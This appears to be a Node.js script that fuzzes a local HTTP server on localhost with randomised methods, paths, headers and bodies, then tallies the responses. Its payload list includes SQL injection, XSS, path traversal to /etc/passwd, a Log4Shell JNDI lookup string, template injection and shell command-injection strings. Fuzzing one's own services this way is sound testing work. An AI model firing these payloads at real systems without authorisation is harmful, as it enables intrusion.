import * as prng from 'lib0/prng'
import * as http from 'node:http'

const seed = Number(process.argv[2]) || Math.floor(Math.random() * 0x7fffffff)
const iterations = Number(process.argv[3]) || 100
const gen = prng.create(seed)

console.log(`HTTP fuzzer → localhost:80 | seed=${seed} iterations=${iterations}\n`)

const METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
const PATH_SEGMENTS = ['api', 'users', 'posts', 'comments', 'admin', 'login', 'logout', 'search', 'upload', 'download', 'config', 'health', 'status', 'v1', 'v2', 'index', 'file', '..', '.']
const COMMON_HEADERS = ['Accept', 'Authorization', 'Cookie', 'User-Agent', 'X-Forwarded-For', 'Referer', 'Origin', 'If-Match', 'Range']
const CONTENT_TYPES = ['application/json', 'application/xml', 'text/plain', 'text/html', 'application/x-www-form-urlencoded', 'application/octet-stream']
const NASTY_STRINGS = [
  '', '\n', '\r\n', '\0', '\t',
  "' OR 1=1--", '" OR ""="', '; DROP TABLE users;--',
  '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
  '../../../etc/passwd', '..\\..\\windows\\system.ini',
  '${jndi:ldap://x.example.com/a}', '{{7*7}}', '#{7*7}',
  '%00', '%0a', '%0d%0a', '%ff',
  'null', 'undefined', 'NaN', 'true', 'false',
  '-1', '0', '2147483647', '2147483648', '-2147483649', '1e308',
  '🔥💀👻', 'А'.repeat(3),
  'A'.repeat(4096),
  '%s%s%s%s%s%n', '`id`', '$(id)', '| cat /etc/passwd'
]

/** @param {prng.PRNG} gen */
const randomString = gen => {
  const kind = prng.uint32(gen, 0, 5)
  switch (kind) {
    case 0: return prng.word(gen, 0, 20)
    case 1: return prng.utf16String(gen, prng.uint32(gen, 0, 30))
    case 2: return String(prng.int53(gen, -1e12, 1e12))
    case 3: return prng.oneOf(gen, NASTY_STRINGS)
    case 4: {
      const len = prng.uint32(gen, 0, 200)
      let s = ''
      for (let i = 0; i < len; i++) s += prng.char(gen)
      return s
    }
    default: return encodeURIComponent(prng.utf16String(gen, 15))
  }
}

/** @param {prng.PRNG} gen */
const randomPath = gen => {
  const depth = prng.uint32(gen, 0, 5)
  const parts = []
  for (let i = 0; i < depth; i++) {
    parts.push(prng.bool(gen) ? prng.oneOf(gen, PATH_SEGMENTS) : encodeURIComponent(randomString(gen)))
  }
  let path = '/' + parts.join('/')
  if (prng.bool(gen)) {
    const qn = prng.uint32(gen, 1, 5)
    const q = []
    for (let i = 0; i < qn; i++) {
      q.push(`${encodeURIComponent(prng.word(gen, 1, 8))}=${encodeURIComponent(randomString(gen))}`)
    }
    path += '?' + q.join('&')
  }
  if (prng.bool(gen) && prng.bool(gen)) {
    path += '#' + encodeURIComponent(randomString(gen))
  }
  return path
}

/** @param {prng.PRNG} gen */
const randomHeaders = gen => {
  const n = prng.uint32(gen, 0, 6)
  /** @type {Record<string, string>} */
  const headers = {}
  for (let i = 0; i < n; i++) {
    const name = prng.bool(gen)
      ? prng.oneOf(gen, COMMON_HEADERS)
      : 'X-' + prng.word(gen, 3, 10)
    let value = randomString(gen)
    value = value.replace(/[\r\n\0]/g, '')
    if (value.length > 0) headers[name] = value
  }
  return headers
}

/** @param {prng.PRNG} gen */
const randomBody = gen => {
  const kind = prng.uint32(gen, 0, 5)
  switch (kind) {
    case 0: return null
    case 1: {
      /** @type {Record<string, unknown>} */
      const obj = {}
      const n = prng.uint32(gen, 0, 6)
      for (let i = 0; i < n; i++) {
        obj[prng.word(gen, 1, 10)] = prng.bool(gen) ? randomString(gen) : prng.int53(gen, -1e6, 1e6)
      }
      return { body: JSON.stringify(obj), contentType: 'application/json' }
    }
    case 2: {
      const parts = []
      const n = prng.uint32(gen, 0, 5)
      for (let i = 0; i < n; i++) {
        parts.push(`${encodeURIComponent(prng.word(gen, 1, 8))}=${encodeURIComponent(randomString(gen))}`)
      }
      return { body: parts.join('&'), contentType: 'application/x-www-form-urlencoded' }
    }
    case 3: {
      const bytes = prng.uint8Array(gen, prng.uint32(gen, 0, 2048))
      return { body: Buffer.from(bytes), contentType: 'application/octet-stream' }
    }
    case 4: {
      return { body: `<?xml version="1.0"?><root><v>${randomString(gen).replace(/[<>&]/g, '')}</v></root>`, contentType: 'application/xml' }
    }
    default:
      return { body: randomString(gen), contentType: prng.oneOf(gen, CONTENT_TYPES) }
  }
}

const sendRequest = (method, path, headers, body) => new Promise(resolve => {
  let req
  try {
    req = http.request({ host: 'localhost', port: 80, method, path, headers, timeout: 2000 }, res => {
      res.on('data', () => {})
      res.on('end', () => resolve({ status: res.statusCode }))
      res.on('error', err => resolve({ error: err.code || err.message }))
    })
  } catch (err) {
    resolve({ error: 'invalid:' + (err.code || err.message) })
    return
  }
  req.on('error', err => resolve({ error: err.code || err.message }))
  req.on('timeout', () => req.destroy(new Error('timeout')))
  try {
    if (body != null) req.write(body)
    req.end()
  } catch (err) {
    resolve({ error: 'write:' + (err.code || err.message) })
  }
})

const truncate = (s, n) => s.length > n ? s.slice(0, n) + '…' : s

const main = async () => {
  const stats = { sent: 0, ok: 0, err: 0, byStatus: /** @type {Record<string, number>} */ ({}) }
  for (let i = 0; i < iterations; i++) {
    const method = prng.oneOf(gen, METHODS)
    const path = randomPath(gen)
    const headers = randomHeaders(gen)
    const hasBody = method !== 'GET' && method !== 'HEAD' && method !== 'TRACE' && prng.bool(gen)
    const info = hasBody ? randomBody(gen) : null
    let body = null
    if (info && info.body != null) {
      body = info.body
      if (!headers['Content-Type']) headers['Content-Type'] = info.contentType
    }

    const result = await sendRequest(method, path, headers, body)
    stats.sent++
    const key = result.status != null ? String(result.status) : ('ERR:' + result.error)
    stats.byStatus[key] = (stats.byStatus[key] ?? 0) + 1
    if (result.status != null) stats.ok++; else stats.err++

    console.log(`[${String(i + 1).padStart(4)}/${iterations}] ${method.padEnd(7)} ${truncate(path, 70).padEnd(72)} → ${key}`)
  }

  console.log(`\nDone. sent=${stats.sent} responded=${stats.ok} errors=${stats.err}`)
  console.log('Breakdown:')
  for (const [k, v] of Object.entries(stats.byStatus).sort((a, b) => b[1] - a[1])) {
    console.log(`  ${k.padEnd(24)} ${v}`)
  }
  console.log(`\nReproduce this run:  node fuzzer.mjs ${seed} ${iterations}`)
}

main().catch(err => {
  console.error('Fatal:', err)
  process.exit(1)
})
